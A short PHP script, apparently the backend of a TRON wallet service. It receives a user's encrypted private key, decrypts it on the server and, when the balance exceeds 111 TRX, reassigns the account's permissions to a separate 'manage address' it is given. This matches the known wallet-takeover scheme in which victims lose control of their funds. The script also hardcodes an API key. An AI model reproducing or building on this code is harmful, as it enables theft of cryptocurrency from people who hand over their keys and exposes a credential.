<?php
 
require 'vendor/autoload.php';
require 'rsa.php';
use Elliptic\EC;
use IEXBase\TronAPI\Tron;
use IEXBase\TronAPI\Constants;
use IEXBase\TronAPI\Provider\HttpProvider;
use IEXBase\TronAPI\Exception\TronException;
//api.shasta.trongrid.io https://api.trongrid.io

 $fullNode = new HttpProvider('https://api.shasta.trongrid.io'); //上线 修改测试网地址
 $solidityNode = new HttpProvider('https://api.shasta.trongrid.io');
 $eventServer = new HttpProvider('https://api.shasta.trongrid.io');
// 初始化Tron客户端
try {
    $tron = new Tron($fullNode, $solidityNode, $eventServer);
    $fullNode->setheaders(
	array('TRON-PRO-API-KEY'=>'80a8b20f-a917-43a9-a2f1-809fe6eec0d6',
	'Content-Type'=> 'application/json'
	)
	);
} catch (TronException $e) {
    exit($e->getMessage());
}


$addressBase58=$_POST['address'];
$actives_address=$_POST['actives_address'];
$manage_address=$_POST['manage_address'];
$pubfile = './key_rsa/rsa_public_key.pem'; 
$prifile = './key_rsa/rsa_private_key.pem'; 
$rsa = new RSA($pubfile, $prifile);
$ret_d = $rsa->decrypt($_POST['private_key']);
$privateKey =$ret_d;
// 设置账户的私钥
$tron->setPrivateKey($privateKey);

    //$ec = new EC('secp256k1');
    //$priv = $ec->keyFromPrivate($privateKey);
    //$pubKeyHex = $priv->getPublic(false, "hex");
    //$pubKeyBin = hex2bin($pubKeyHex);
    //$addressHex = $tron->getAddressHex($pubKeyBin);
    //$addressBin = hex2bin($addressHex);
    //$addressBase58 = $tron->getBase58CheckAddress($addressBin);

// 设置要更新权限的账户地址
$accountAddress = $addressBase58;


 $transactionxx = $tron->getBalance(
   
    $accountAddress, true
  
);
//exit($transactionxx);

if($transactionxx>111){
	// 创建一个权限修改的事务
$transaction = $tron->accountpermissionupdate(
    $accountAddress, // 账户地址
    $manage_address,//控制地址
    $actives_address//权限组名称
);



// 签名事务
$signedTransaction = $transaction;


if($signedTransaction['code']=='true'){
	echo json_encode(array("code"=>200,"msg"=>json_encode($signedTransaction),"data"=>null));	
	}else{
		echo json_encode(array("code"=>400,"msg"=>json_encode($signedTransaction),"data"=>null));	
		}
	
	}else{

	echo json_encode(array("code"=>400,"msg"=>"余额少于111 TRX,无法多签<br />还需转入 111 TRX","data"=>null));	
		}
 

?>